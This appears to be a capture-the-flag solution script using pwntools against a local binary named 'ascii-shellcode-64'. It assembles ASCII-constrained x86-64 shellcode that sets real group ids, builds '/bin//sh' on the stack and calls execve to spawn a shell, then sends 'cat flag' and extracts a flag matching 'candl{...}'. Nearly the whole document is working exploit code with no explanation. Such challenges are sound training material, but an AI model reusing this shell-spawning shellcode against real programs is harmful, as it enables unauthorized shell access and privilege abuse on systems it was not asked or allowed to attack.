from pwn import *

context.arch = "x86-64"
context.bits = 64

shellcode = asm('''
push   0x6c
pop    rax
syscall

push   rax
push   rax
pop    rdi
pop    rsi
push   0x72
pop    rax
syscall

push   0x31
pop    rax
xor    al,0x31
push   rax
push   rax
pop    rsi
pop    rdx
push   0x69622f2f
push   0x68732f6e
pop    rax
xor    [rsp+0x4], eax

push   rsp
pop    rdi
push   0x3b
pop    rax
syscall
''')

print(disasm(shellcode))

with open("shellcode.bin", "wb") as file:
    file.write(shellcode)

io = process("./ascii-shellcode-64", env={})

import re
io.sendlineafter(b'Reading', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)

